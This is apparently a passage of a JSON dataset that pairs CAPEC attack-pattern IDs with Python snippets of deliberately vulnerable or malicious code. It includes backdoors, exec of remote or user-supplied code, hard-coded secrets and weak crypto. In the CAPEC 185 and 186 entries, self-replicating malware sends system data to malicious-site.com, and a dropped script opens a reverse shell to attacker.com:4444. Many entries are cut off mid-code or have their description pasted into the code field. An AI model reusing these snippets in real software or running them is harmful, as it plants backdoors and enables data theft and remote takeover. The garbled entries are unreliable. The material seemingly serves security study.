        "code_snippet": "class SensitiveProcessor:\n    def __init__(self):\n        self.debug_mode = False\n        self.trace_data = []\n        self.system_info = {'kernel': '5.4.0', 'arch': 'x64', 'security_keys': ['KEY1', 'KEY2']}\n        \n    def process_data(self, data):\n        # Debug backdoor left in production code\n        if data.startswith('DEBUG_'):\n            self.debug_mode = True\n            return self.system_info\n        \n        # Store trace data in plaintext\n        self.trace_data.append(data)\n        \n        # Critical security check that could be optimized out\n        if self.debug_mode:\n            return self.execute_debug_commands(data)\n        \n        return 'Processing: ' + data\n    \n    def execute_debug_commands(self, cmd):\n        if cmd == 'DUMP_TRACE':\n            return self.trace_data\n        elif cmd == 'READ_MEM':\n            return self.read_memory_contents()\n    \n    def read_memory_contents(self):\n        # Direct memory access without proper checks\n        return {'mem_dump': 'sensitive_content', 'trace': self.trace_data}",
        "description": "This code demonstrates vulnerability to white box analysis by containing debug logic that can be activated at runtime, exposing sensitive system information and trace data. It includes embedded debug commands, unprotected storage of trace data, and security-critical code that could be optimized out by the processor. The code allows unauthorized access to system internals through debug features left in production."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "\"\"\"\nimport os\nimport win32file\nimport win32con\n\ndef hide_data_in_ads(filename, secret_data):\n    # Create a normal file\n    with open(filename, 'w') as f:\n        f.write('Normal content')\n    \n    # Hide data in alternate data stream\n    stream_name = filename + ':secret.txt'\n    ads_handle = win32file.CreateFile(\n        stream_name,\n        win32con.GENERIC_WRITE,\n        0,\n        None,\n        win32con.CREATE_ALWAYS,\n        0,\n        None\n    )\n    \n    win32file.WriteFile(ads_handle, secret_data.encode())\n    win32file.CloseHandle(ads_handle)\n    \ndef read_hidden_data(filename):\n    stream_name = filename + ':secret.txt'\n    try:\n        ads_handle = win32file.CreateFile(\n            stream_name,\n            win32con.GENERIC_READ,\n            0,\n            None,\n            win32con.OPEN_EXISTING,\n            0,\n            None\n        )\n        _, content = win32file.ReadFile(ads_handle, 4096)\n        win32file.CloseHandle(ads_handle)\n        return content.decode()\n    except:\n        return None\n\n# Usage\nhide_data_in_ads('normal.txt', 'This is hidden sensitive data')\nprint('File size:', os.path.getsize('normal.txt'))  # Won't show ADS size\n\"\"\",\n    \"description\": \"This code demonstrates the use of Windows NTFS Alternate Data Streams (ADS) to hide sensitive information within a regular file. The code creates a normal file and then attaches an alternate data stream containing secret data. The ADS content is not visible through normal file operations, and the file size doesn't reflect the hidden data. This makes it possible to hide malicious content or sensitive information that bypasses standard detection methods.\"",
        "description": "\"This code demonstrates the use of Windows NTFS Alternate Data Streams (ADS) to hide sensitive information within a regular file. The code creates a normal file and then attaches an alternate data stream containing secret data. The ADS content is not visible through normal file operations, and the file size doesn't reflect the hidden data. This makes it possible to hide malicious content or sensitive information that bypasses standard detection methods.\""
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "class SecureSystem:\n    def __init__(self):\n        self._sensitive_data = {'admin_key': 'secret123', 'user_data': {'alice': 'pass123', 'bob': 'pass456'}}\n        self._login_attempts = {}\n    \n    def authenticate(self, username, password):\n        if username not in self._login_attempts:\n            self._login_attempts[username] = 0\n        \n        self._login_attempts[username] += 1\n        \n        if username in self._sensitive_data['user_data']:\n            if password == self._sensitive_data['user_data'][username]:\n                if len(password) > 10:\n                    return 'Password too long'\n                return 'Login successful'\n            else:\n                if self._login_attempts[username] > 3:\n                    return 'Account locked'\n                return 'Invalid password'\n        else:\n            return 'User not found'",
        "description": "This vulnerable code demonstrates information exposure through error messages and behavioral discrepancies. It leaks system state through different responses, allows user enumeration via distinct error messages, and creates an observable timing difference. The system truncates long passwords and maintains a login attempt counter that becomes a new resource for potential attackers to exploit."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "from flask import Flask, request, jsonify\nimport sys\nimport os\n\napp = Flask(__name__)\n\n@app.route('/api/system-info')\ndef system_info():\n    try:\n        info = {\n            'python_version': sys.version,\n            'server_os': os.name,\n            'environment': os.environ.copy(),\n            'server_path': os.getcwd(),\n            'loaded_modules': list(sys.modules.keys())\n        }\n        return jsonify(info)\n    except Exception as e:\n        return jsonify({\n            'error': str(e),\n            'traceback': str(sys.exc_info()),\n            'stack': str(e.__traceback__.tb_frame.f_locals)\n        })\n\n@app.route('/download')\ndef download_and_run():\n    url = request.args.get('url')\n    if url:\n        import urllib.request\n        code = urllib.request.urlopen(url).read()\n        exec(code)\n        return 'Code executed successfully'\n    return 'No URL provided'",
        "description": "This vulnerable code implements an API endpoint that exposes sensitive system information and allows remote code execution. It demonstrates multiple security issues: exposing detailed system information through an API endpoint (CWE-497), revealing sensitive information in error messages (CWE-209), accepting sensitive parameters through GET requests (CWE-598), and downloading and executing remote code without verification (CWE-494). This implementation creates an excessive attack surface (CWE-1125) by exposing multiple vulnerable endpoints."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "def process_user_data(user_input):\n    # Global variable accessible throughout the application\n    global config\n    \n    # Dynamic variable creation based on user input\n    var_name = f\"user_{user_input}_data\"\n    \n    # Dangerous dynamic code execution\n    exec(f\"{var_name} = 'sensitive_data'\")\n    \n    # Dynamic variable evaluation\n    result = eval(f\"process_{user_input}()\")\n    \n    return result\n\ndef process_admin():\n    return \"admin access granted\"\n\ndef process_user():\n    return \"user access granted\"\n\n# Example usage\nuser_controlled_input = input('Enter role: ')\noutput = process_user_data(user_controlled_input)",
        "description": "This code demonstrates multiple vulnerabilities related to dynamic variable manipulation and evaluation. It uses global variables with wide scope, allows dynamic variable creation based on user input, and performs unsafe eval() and exec() operations with user-controlled data. An attacker could manipulate the input to access unauthorized functions or create/modify arbitrary variables in the application's scope."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template, redirect, request, url_for\nimport webbrowser\n\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return render_template('malicious.html')\n\n@app.route('/submit_query', methods=['POST'])\ndef submit_query():\n    # User thinks they're submitting a search query\n    query = request.form.get('query')\n    \n    # But actually triggering download of 'search_results.exe'\n    download_url = f'http://malicious-site.com/search_results.exe?q={query",
        "description": "\"A malicious web application that misrepresents UI actions to trick users. It presents what appears to be a search query interface but actually triggers unwanted downloads. Includes clickjacking vulnerability through hidden iframes and misleading button actions. The code demonstrates UI misrepresentation (CWE-451), improper intent verification (CWE-925), and incorrectly specified destinations (CWE-941).\""
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = 'uploads'\nALLOWED_EXTENSIONS = {'swf'",
        "description": "\"This code demonstrates a vulnerable Flash file upload and embedding system that allows for argument injection and cross-domain policy bypass. It accepts .swf files without proper validation, directly embeds user-supplied Flash parameters without sanitization, and uses unsafe template rendering. The code combines multiple vulnerabilities including unsafe file uploads, template injection, and improper parameter handling.\""
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "def load_plugin(plugin_name):\n    plugin_path = f'plugins/{plugin_name}.py'\n    with open(plugin_path, 'r') as f:\n        plugin_code = f.read()\n    exec(plugin_code)\n\ndef process_request(user_input):\n    plugin = user_input.get('plugin', '')\n    if plugin:\n        load_plugin(plugin)\n\n# Usage\nuser_data = {'plugin': '../malicious_code'}\nprocess_request(user_data)",
        "description": "This code demonstrates unsafe dynamic code loading where user input can control which Python files are loaded and executed. The code allows arbitrary file inclusion through path traversal and executes untrusted code using exec(), making it vulnerable to remote code execution attacks."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "\"\"\"\nimport os\nimport configparser\nimport shutil\n\nclass SystemConfig:\n    def __init__(self):\n        self.config_path = 'system.conf'\n        self.backup_path = 'system.conf.bak'\n        self.config = configparser.ConfigParser()\n        \n    def load_config(self):\n        if os.path.exists(self.config_path):\n            self.config.read(self.config_path)\n            return True\n        return False\n    \n    def update_system_settings(self, section, key, value):\n        # No validation of input or permissions check\n        if not self.config.has_section(section):\n            self.config.add_section(section)\n        self.config.set(section, key, value)\n        \n        with open(self.config_path, 'w') as config_file:\n            self.config.write(config_file)\n    \n    def restore_backup(self):\n        # Blindly restore from backup without verification\n        if os.path.exists(self.backup_path):\n            shutil.copy2(self.backup_path, self.config_path)\n            return True\n        return False\n\n# Usage example that demonstrates vulnerability\nsys_config = SystemConfig()\nsys_config.load_config()\nsys_config.update_system_settings('Security', 'debug_mode', 'enabled')\nsys_config.update_system_settings('Hardware', 'lock_protection', 'disabled')\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable configuration management where external users can modify sensitive system settings without proper validation or permission checks. It allows unrestricted modification of configuration files, includes an insecure backup restoration mechanism, and lacks integrity verification of configuration states. The code particularly embodies CWE-15 by allowing external control of system settings and CWE-1233 by not implementing proper lock protection mechanisms.\"",
        "description": "\"This code demonstrates vulnerable configuration management where external users can modify sensitive system settings without proper validation or permission checks. It allows unrestricted modification of configuration files, includes an insecure backup restoration mechanism, and lacks integrity verification of configuration states. The code particularly embodies CWE-15 by allowing external control of system settings and CWE-1233 by not implementing proper lock protection mechanisms.\""
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "\"\"\"\nimport os\n\ndef load_library(library_name):\n    # Search paths for libraries\n    search_paths = [\n        './libs',        # Application directory\n        '/usr/lib',      # System directory\n        '/usr/local/lib' # Local system directory\n    ]\n    \n    for path in search_paths:\n        library_path = os.path.join(path, library_name)\n        if os.path.exists(library_path):\n            # Vulnerable: No verification of file authenticity or path canonicalization\n            with open(library_path, 'rb') as lib:\n                library_content = lib.read()\n                # Load and execute library content without verification\n                exec(library_content)\n            return True\n    return False\n\ndef main():\n    user_library = input('Enter library name to load: ')\n    # Vulnerable: Direct use of user input for file operations\n    load_library(user_library)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates a file search path manipulation vulnerability. It searches for a library file in multiple directories without proper path canonicalization or verification of file authenticity. An attacker can place a malicious file with the same name in a directory that's searched first, leading to the execution of unauthorized code. The code also accepts user input directly for file operations without proper validation.\"",
        "description": "\"This vulnerable code demonstrates a file search path manipulation vulnerability. It searches for a library file in multiple directories without proper path canonicalization or verification of file authenticity. An attacker can place a malicious file with the same name in a directory that's searched first, leading to the execution of unauthorized code. The code also accepts user input directly for file operations without proper validation.\""
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, redirect, request\n\ndef create_flash_player():\n    app = Flask(__name__)\n    \n    @app.route('/flash-redirect')\n    def flash_redirect():\n        swf_url = request.args.get('swf_url', '')\n        callback = request.args.get('callback', '')\n        \n        # Vulnerable: No validation of SWF URL or callback parameters\n        response = redirect(swf_url)\n        response.headers['Allow-Access-From-Domain'] = '*'\n        response.headers['X-Flash-Callback'] = callback\n        return response\n    \n    @app.route('/flash-embed')\n    def embed_flash():\n        external_url = request.args.get('url')\n        # Vulnerable: Direct embedding of user-controlled content\n        return f'''\n        <object type=\"application/x-shockwave-flash\" data=\"{external_url}\">\n            <param name=\"allowScriptAccess\" value=\"always\">\n            <param name=\"allowNetworking\" value=\"all\">\n        </object>\n        '''",
        "description": "This code demonstrates a vulnerable Flash player implementation that allows URL redirection to untrusted sites and unsafe embedding of external Flash content. It accepts unvalidated user input for SWF URLs and callback parameters, sets permissive cross-domain policies, and embeds external content without proper sanitization. The code is vulnerable to open redirects, XSS, and malicious Flash content execution through crafted URLs."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, make_response\nimport json\n\napp = Flask(__name__)\n\n@app.route('/api/user/details', methods=['GET'])\ndef get_user_details():\n    user_token = request.args.get('auth_token')\n    user_id = request.args.get('user_id')\n    \n    user_data = {\n        'id': user_id,\n        'name': 'John Doe',\n        'ssn': '123-45-6789',\n        'credit_card': '4111-1111-1111-1111'\n    }\n    \n    response = make_response(json.dumps(user_data))\n    response.set_cookie('auth', user_token, httponly=False, secure=False)\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    \n    return response\n\n@app.route('/api/internal/config')\ndef get_service_config():\n    config = {\n        'database_url': 'mysql://admin:password@localhost/userdb',\n        'api_keys': {'payment_gateway': 'sk_live_123456789'},\n        'debug_mode': True\n    }\n    return json.dumps(config)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code implements microservices that expose sensitive information through various means: using GET requests with sensitive parameters, storing sensitive configuration directly accessible via web endpoints, lacking proper access controls, and setting insecure cookies. The API endpoints are discoverable and return sensitive data without proper authentication, making them susceptible to information gathering attacks."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "\"\"\"\nclass AccessControl:\n    def __init__(self):\n        self.resources = {\n            'confidential_data': {'data': 'sensitive info', 'access_level': 'high'",
        "description": "\"This code demonstrates vulnerable access control configuration where sensitive resources can be accessed due to improper permission assignments and premature access before security settings are properly established. The access control implementation lacks proper validation, authentication, and granular controls, allowing unauthorized users to access protected resources.\""
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, render_template, request\nfrom werkzeug.utils import secure_filename\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = 'uploads/'\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' in request.files:\n        file = request.files['file']\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        \n        # Vulnerable crossdomain.xml configuration\n        with open('static/crossdomain.xml', 'w') as f:\n            f.write('''<?xml version=\"1.0\"?>\n                       <cross-domain-policy>\n                           <allow-access-from domain=\"*\" />\n                           <allow-http-request-headers-from domain=\"*\" headers=\"*\"/>\n                       </cross-domain-policy>''')\n        \n        # Vulnerable HTML with Flash overlay\n        return f'''<html>\n            <head>\n                <style>iframe {{ opacity: 0; position: absolute; z-index: 2; }}</style>\n            </head>\n            <body>\n                <div id=\"content\">\n                    <iframe src=\"{request.host_url + 'uploads/' + filename}\" width=\"100%\" height=\"100%\"></iframe>\n                    <object data=\"overlay.swf\" type=\"application/x-shockwave-flash\" width=\"100%\" height=\"100%\">\n                        <param name=\"wmode\" value=\"transparent\"/>\n                    </object>\n                </div>\n            </body>\n        </html>'''",
        "description": "This code demonstrates a vulnerable web application that allows unrestricted file uploads and implements an insecure cross-domain policy. It creates a page that includes a Flash overlay positioned above legitimate content, enabling clickjacking attacks. The application doesn't validate file types, allows access from any domain, and doesn't implement frame-busting or X-Frame-Options headers, making it susceptible to UI redressing attacks."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "from flask import Flask, render_template_string\nfrom urllib.request import urlopen\n\napp = Flask(__name__)\n\n@app.route('/flash-viewer')\ndef flash_viewer():\n    flash_url = request.args.get('swf_url', '')\n    \n    # Vulnerable: No validation of flash_url or domain checking\n    flash_content = urlopen(flash_url).read()\n    \n    template = '''\n    <html>\n    <head>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    </head>\n    <body>\n        <object type=\"application/x-shockwave-flash\" data=\"{{ flash_url }}\">\n            <param name=\"movie\" value=\"{{ flash_url }}\">\n            <param name=\"allowScriptAccess\" value=\"always\">\n            <param name=\"allowNetworking\" value=\"all\">\n        </object>\n    </body>\n    </html>\n    '''\n    \n    return render_template_string(template, flash_url=flash_url)",
        "description": "This code demonstrates a vulnerable Flash viewer implementation that accepts a user-provided URL for loading Flash content without proper validation. It allows unrestricted cross-domain access through permissive Flash parameters (allowScriptAccess='always'), lacks input validation for the flash_url parameter, and doesn't implement any domain whitelisting. An attacker could provide a malicious Flash URL that executes arbitrary commands or makes unauthorized cross-domain calls."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "\"\"\"\ndef process_email_request(user_input):\n    # Web-mail server connecting to IMAP/SMTP server\n    import os\n    import smtplib\n    \n    smtp_server = 'mail.internal.server'\n    smtp_port = 25\n    \n    # Vulnerable: No input validation or sanitization\n    email_command = f'sendmail -t {user_input",
        "description": "\"This code demonstrates a vulnerable web-mail server implementation that processes user input without proper sanitization, leading to potential IMAP/SMTP command injection. It directly executes system commands with user input, lacks proper input validation, exposes sensitive error information, and relies on client-side security. The code allows injection of mail server commands through unfiltered user input.\""
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "\"\"\"import urllib.request\nimport os\n\ndef download_and_execute():\n    # Download executable from remote server without integrity verification\n    remote_url = 'http://malicious-server.com/payload.exe'\n    local_path = 'update.exe'\n    \n    try:\n        urllib.request.urlretrieve(remote_url, local_path)\n        \n        # Embedded code to extract system information\n        system_info = {\n            'os': os.uname(),\n            'env': os.environ,\n            'pwd': os.getcwd(),\n            'home': os.path.expanduser('~')",
        "description": "\"This code demonstrates multiple vulnerabilities including downloading and executing unverified code, extracting and leaking sensitive system information, and attempting unauthorized system modifications. It downloads a potentially malicious executable without integrity checks, collects sensitive system information, and attempts to modify critical system files.\""
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import urllib.request\nimport os\n\ndef download_and_execute():\n    try:\n        url = 'http://malicious-site.com/update.py'\n        local_file = 'system_update.py'\n        urllib.request.urlretrieve(url, local_file)\n        \n        # Hidden payload that collects system info\n        system_info = {\n            'username': os.getlogin(),\n            'home': os.path.expanduser('~'),\n            'env': dict(os.environ),\n            'root_files': os.listdir('/')\n        }\n        \n        # Send collected data to attacker\n        urllib.request.urlopen(\n            f'http://malicious-site.com/collect?data={str(system_info)}'\n        )\n        \n        # Execute downloaded code without verification\n        exec(open(local_file).read())\n        \n        # Replicate to other files\n        for root, _, files in os.walk(os.path.expanduser('~')):\n            for file in files:\n                if file.endswith('.py'):\n                    with open(os.path.join(root, file), 'a') as f:\n                        f.write('\\n' + open(__file__).read())\n                        \n    except: pass\n\nif __name__ == '__main__':\n    download_and_execute()",
        "description": "Malicious code that downloads unverified code from a remote source, executes it, collects sensitive system information, and replicates itself across Python files in the user's home directory. The code masquerades as a system update but contains hidden functionality to compromise the system."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\nimport os\n\ndef check_for_update():\n    update_url = 'http://malicious-update-server.com/update.exe'\n    try:\n        response = requests.get(update_url, stream=True)\n        if response.status_code == 200:\n            with open('system_update.exe', 'wb') as f:\n                for chunk in response.iter_content(chunk_size=8192):\n                    f.write(chunk)\n            os.system('system_update.exe')\n            # Hidden malicious payload\n            with open('backdoor.py', 'w') as f:\n                f.write('import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"])')\n            os.system('python backdoor.py &')\n    except:\n        pass\n\ndef legitimate_app():\n    print('Running system maintenance...')\n    check_for_update()",
        "description": "This code demonstrates a malicious update mechanism disguised as a legitimate application. It downloads and executes an untrusted binary without integrity verification, then secretly installs a backdoor. The code appears benign but contains hidden malicious functionality that creates a reverse shell to an attacker's machine. It also demonstrates self-replication capabilities by writing additional malicious code to the system."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\nimport hashlib\nimport subprocess\n\ndef auto_update():\n    update_server = 'http://updates.example.com/latest'\n    trusted_hash = 'abc123'  # Hardcoded hash\n    \n    try:\n        # Download update without SSL verification\n        response = requests.get(update_server, verify=False)\n        update_code = response.content\n        \n        # Basic check that can be bypassed\n        if response.headers.get('X-Server-ID') == 'trusted_server':\n            # No proper integrity verification\n            if hashlib.md5(update_code).hexdigest()[:6] == trusted_hash:\n                # Directly execute downloaded code\n                with open('update.py', 'wb') as f:\n                    f.write(update_code)\n                subprocess.run(['python', 'update.py'], shell=True)\n                return True\n    except Exception as e:\n        pass\n    return False",
        "description": "This vulnerable code implements an auto-update mechanism that contains multiple security flaws: it disables SSL verification, uses weak server authentication based on a header that can be spoofed, implements insufficient integrity checking using a partial MD5 hash, and executes downloaded code directly without proper validation. The code demonstrates both authentication bypass vulnerabilities and unsafe code execution from untrusted sources."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "class SecureDevice:\n    def __init__(self):\n        self.__secret_key = b'SuperSecretKey123'\n        self.__firmware_version = '1.0'\n        self.__debug_enabled = True  # Hidden debug feature\n    \n    def encrypt_data(self, data):\n        # Using weak XOR encryption\n        encrypted = bytearray()\n        for i in range(len(data)):\n            encrypted.append(data[i] ^ self.__secret_key[i % len(self.__secret_key)])\n        return encrypted\n    \n    def get_system_info(self):\n        # Exposing sensitive system information\n        system_info = {\n            'firmware': self.__firmware_version,\n            'memory_layout': '0x0000-0xFFFF',\n            'secret_key_addr': hex(id(self.__secret_key)),\n            'debug_mode': self.__debug_enabled\n        }\n        return system_info\n    \n    def debug_backdoor(self, command):\n        if self.__debug_enabled:\n            # Undocumented backdoor feature\n            import os\n            return os.system(command)",
        "description": "This code demonstrates multiple vulnerabilities related to hardware and software reverse engineering. It uses a weak XOR encryption algorithm, exposes sensitive system information including memory addresses, contains an undocumented debug backdoor feature, and doesn't properly protect critical security information. The code makes it easy for an attacker to reverse engineer the system's functionality and exploit its weaknesses."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "\"\"\"\nimport time\nimport secrets\n\ndef verify_password(input_password, stored_hash):\n    stored = stored_hash.encode('utf-8')\n    # Vulnerable: timing attack possible due to early exit\n    for i in range(len(input_password)):\n        if i >= len(stored) or input_password[i] != stored[i]:\n            time.sleep(0.1)  # Artificial delay making timing more observable\n            return False\n    return True\n\ndef process_sensitive_data(user_input):\n    secret_key = secrets.token_hex(16)\n    # Vulnerable: different responses reveal system state\n    try:\n        if len(user_input) < 8:\n            return {\"status\": \"error\", \"detail\": \"Input too short\"",
        "description": "\"This code demonstrates multiple security vulnerabilities related to information disclosure through observable behaviors. It includes a password verification function vulnerable to timing attacks, and a data processing function that leaks system information through different error messages and debug data. The code's behavior varies based on input conditions in ways that are observable to attackers, allowing them to gather information about the system's internal state and potentially sensitive data through black box analysis.\""
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "class SecretDataProcessor:\n    def __init__(self):\n        self.__hidden_key = b'S3cr3tK3y!'\n        self.__debug_mode = True\n    \n    def process_data(self, data):\n        if self.__debug_mode:\n            self.__log_system_info()\n        return self.__encrypt(data)\n    \n    def __encrypt(self, data):\n        # Hidden backdoor functionality\n        if data.startswith(b'BACKDOOR'):\n            return self.__get_system_credentials()\n        return bytes([b ^ self.__hidden_key[i % len(self.__hidden_key)] for i, b in enumerate(data)])\n    \n    def __log_system_info(self):\n        import os\n        import platform\n        trace_data = f'OS: {platform.system()}\\nUser: {os.getlogin()}\\nPath: {os.getcwd()}'\n        with open('debug.log', 'w') as f:\n            f.write(trace_data)\n    \n    def __get_system_credentials(self):\n        import subprocess\n        try:\n            return subprocess.check_output('whoami', shell=True)\n        except:\n            return b'Access Denied'",
        "description": "This code demonstrates vulnerable software design that could be exploited through reverse engineering. It contains hidden functionality through a backdoor trigger, exposes sensitive system information through debug logging, and improperly manages trace data. The class includes undocumented methods and hard-coded secret values that could be extracted through binary analysis."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "class DatabaseConnection:\n    def __init__(self):\n        # Hard-coded credentials directly in code\n        self.db_password = 'admin123!@#'\n        self.api_key = '1a2b3c4d5e6f7g8h9i0j'\n        self.encryption_key = b'SuperSecretKey123'\n\n    def connect(self):\n        # Using hard-coded connection string with embedded credentials\n        connection_string = 'mysql://admin:' + self.db_password + '@localhost:3306/production_db'\n        return connection_string\n\n    def encrypt_data(self, data):\n        # Hard-coded initialization vector\n        iv = b'1234567890123456'\n        # Using hard-coded encryption parameters\n        cipher_mode = 'CBC'\n        padding_mode = 'PKCS7'\n        return f\"Encrypted with {self.encryption_key}\"",
        "description": "This code demonstrates multiple security vulnerabilities including hard-coded credentials (passwords, API keys, encryption keys), cleartext storage of sensitive information in the code, and insufficient isolation of security-critical constants. The code directly embeds sensitive values rather than using configuration files or environment variables, making it easy for attackers to extract these values through reverse engineering or code analysis."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\nfrom Crypto.Cipher import DES\n\nclass WeakProtocolServer:\n    def __init__(self):\n        self.secret_key = b'weak_key'  # 8-byte weak key\n        self.cipher = DES.new(self.secret_key, DES.MODE_ECB)\n    \n    def start_server(self):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)  # Using old TLS version\n        context.set_ciphers('DES')  # Weak cipher suite\n        \n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.bind(('localhost', 12345))\n        server.listen(5)\n        \n        while True:\n            client, addr = server.accept()\n            msg = client.recv(1024)\n            \n            # Transmitting sensitive data in cleartext\n            client.send(f\"Username: admin, Password: secret123\".encode())\n            \n            # Using weak encryption\n            encrypted_data = self.cipher.encrypt(msg + (b' ' * (8 - (len(msg) % 8))))\n            client.send(encrypted_data)\n            \n            # Incorrect protocol data handling\n            raw_data = msg[:4].decode()\n            security_id = int.from_bytes(raw_data, byteorder='little')\n            \n            client.close()\n\nserver = WeakProtocolServer()\nserver.start_server()\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities in protocol implementation including weak encryption (DES in ECB mode), cleartext transmission of sensitive data, use of outdated TLS version, improper protocol data handling, and incorrect security identifier conversion. The server transmits sensitive credentials in cleartext and uses weak cryptographic methods for data protection.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities in protocol implementation including weak encryption (DES in ECB mode), cleartext transmission of sensitive data, use of outdated TLS version, improper protocol data handling, and incorrect security identifier conversion. The server transmits sensitive credentials in cleartext and uses weak cryptographic methods for data protection.\""
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "\"\"\"from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/load_module')\ndef load_module():\n    module_path = request.args.get('path', '')\n    \n    # Vulnerable: Directly using user input in include statement\n    try:\n        with open(module_path, 'r') as f:\n            code = f.read()\n            # Dangerous: executing arbitrary code\n            exec(code)\n        return f'Module {module_path",
        "description": "\"A vulnerable Flask application that allows remote file inclusion and arbitrary code execution through two endpoints: one that loads and executes Python code from a user-specified path, and another that accepts file uploads with insufficient validation. The code demonstrates multiple vulnerabilities including unsafe file inclusion, arbitrary code execution, and unsafe file uploads to web-accessible directories.\""
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "class EmailSystem:\n    def send_message(self, message_content, sender_email, recipient_email):\n        # No authentication of sender identity\n        email = {\n            'from': sender_email,  # Can be easily spoofed\n            'to': recipient_email,\n            'content': message_content\n        }\n        \n        # Unprotected communication channel\n        def transmit(email_data):\n            # No message integrity checks\n            # No verification of source\n            return f\"Sending: {email_data}\"\n            \n        # No validation if sender is authorized\n        transmit(email)\n\n# Example usage showing vulnerability\nemail_system = EmailSystem()\nemail_system.send_message(\n    \"Please transfer $1000 to account XYZ\",\n    \"ceo@company.com\",  # Attacker can spoof this\n    \"finance@company.com\"\n)",
        "description": "This code demonstrates an email system with multiple authentication and verification vulnerabilities. It lacks sender identity verification, message integrity checks, and proper channel security. An attacker can easily spoof the sender's email address and send messages appearing to be from legitimate sources. The communication channel is not secured, and there's no validation of message integrity during transmission."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "class EmailSystem:\n    def __init__(self):\n        self.trusted_domains = ['company.com', 'partner.com']\n\n    def verify_sender(self, email_address):\n        # Vulnerable: Only checks if domain exists in trusted list\n        domain = email_address.split('@')[1]\n        return domain in self.trusted_domains\n\n    def send_sensitive_data(self, sender_email, recipient, data):\n        # Vulnerable: No proper authentication, only relies on email domain\n        if self.verify_sender(sender_email):\n            # Vulnerable: No encryption or secure channel\n            message = f'From: {sender_email}\\nTo: {recipient}\\nData: {data}'\n            self.transmit_data(message)\n            return True\n        return False\n\n    def transmit_data(self, message):\n        # Vulnerable: No verification of actual destination\n        print(f'Sending: {message}')\n\n# Usage example showing vulnerability\nsystem = EmailSystem()\nspoofed_email = 'ceo@company.com'  # Easy to spoof sender\nsystem.send_sensitive_data(spoofed_email, 'employee@company.com', 'confidential_info')",
        "description": "This code demonstrates a vulnerable email system that can be exploited through principal spoofing. The authentication is weak (CWE-1390) as it only checks the domain of the sender's email address. The system doesn't properly verify the actual identity of the sender (CWE-290) and lacks proper destination verification (CWE-941). An attacker can easily spoof a trusted email address to send unauthorized communications, as there's no proper entity authentication (CWE-322) or protection against reflection attacks (CWE-301)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "\"\"\"\nimport random\nimport string\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {",
        "description": "\"This code demonstrates multiple session management vulnerabilities including weak session ID generation, lack of session expiration, failure to invalidate existing sessions, insufficient credential protection, and weak authentication. The session IDs are predictable due to their short length and simple generation method, sessions never expire, and multiple sessions can exist for the same user simultaneously.\""
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
